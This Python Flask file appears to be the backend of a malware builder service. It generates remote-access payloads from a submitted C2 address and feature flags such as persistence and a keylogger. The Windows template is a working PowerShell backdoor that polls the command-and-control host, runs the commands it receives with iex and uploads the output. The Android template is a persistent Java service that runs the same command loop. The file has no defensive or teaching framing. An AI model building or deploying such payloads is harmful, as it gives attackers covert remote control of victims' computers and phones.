#!/usr/bin/env python3
# builder_api.py
from flask import Flask, request, jsonify
import hashlib
import time
import os

app = Flask(__name__)

@app.route('/api/v1/build', methods=['POST'])
def build_payload():
    """
    API endpoint for building payloads
    Expects JSON with:
    {
        "os": "windows|android",
        "c2_ip": "x.x.x.x",
        "c2_port": "4444",
        "features": {
            "persistence": true,
            "keylogger": true,
            ...
        }
    }
    """
    data = request.json
    
    # Validate input
    if not data.get('c2_ip'):
        return jsonify({'error': 'C2 IP required'}), 400
    
    # Generate unique payload
    payload_id = hashlib.md5(f"{data['c2_ip']}:{time.time()}".encode()).hexdigest()[:8]
    
    # Build payload based on OS
    if data.get('os', 'windows') == 'windows':
        payload = generate_windows_payload(data, payload_id)
        filename = f"sf_payload_{payload_id}.ps1"
    else:
        payload = generate_android_payload(data, payload_id)
        filename = f"sf_payload_{payload_id}.java"
    
    # Save to builds directory
    os.makedirs('builds', exist_ok=True)
    with open(f'builds/{filename}', 'w') as f:
        f.write(payload)
    
    return jsonify({
        'success': True,
        'payload_id': payload_id,
        'filename': filename,
        'download_url': f'/download/{filename}'
    })

def generate_windows_payload(config, payload_id):
    """Generate actual Windows PowerShell payload"""
    template = f'''
$C2_IP = "{config['c2_ip']}"
$C2_PORT = {config.get('c2_port', 4444)}
$PAYLOAD_ID = "{payload_id}"

function Execute-Command {{
    param($cmd)
    try {{
        $output = iex $cmd 2>&1 | Out-String
        return $output
    }} catch {{
        return "Error: $_"
    }}
}}

while($true) {{
    try {{
        $wc = New-Object System.Net.WebClient
        $response = $wc.DownloadString("http://$C2_IP`:$C2_PORT/ping/$PAYLOAD_ID")
        
        if($response -ne "none") {{
            $result = Execute-Command $response
            $wc.UploadString("http://$C2_IP`:$C2_PORT/result/$PAYLOAD_ID", $result)
        }}
        
        Start-Sleep -Seconds 30
    }} catch {{
        Start-Sleep -Seconds 60
    }}
}}
'''
    return template

def generate_android_payload(config, payload_id):
    """Generate Android Java service payload"""
    template = f'''
// Android Service Payload
// C2: {config['c2_ip']}:{config.get('c2_port', 4444)}
// ID: {payload_id}

public class MainService extends Service {{
    private final String C2_URL = "http://{config['c2_ip']}:{config.get('c2_port', 4444)}";
    private final String VICTIM_ID = "{payload_id}";
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {{
        // Start command loop in background
        new Thread(new CommandRunner()).start();
        return START_STICKY;
    }}
    
    class CommandRunner implements Runnable {{
        public void run() {{
            while(true) {{
                try {{
                    // Check for commands
                    String cmd = getCommand();
                    if(cmd != null) {{
                        String result = execute(cmd);
                        sendResult(result);
                    }}
                    Thread.sleep(30000);
                }} catch(Exception e) {{
                    e.printStackTrace();
                }}
            }}
        }}
    }}
}}
'''
    return template

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000, debug=False)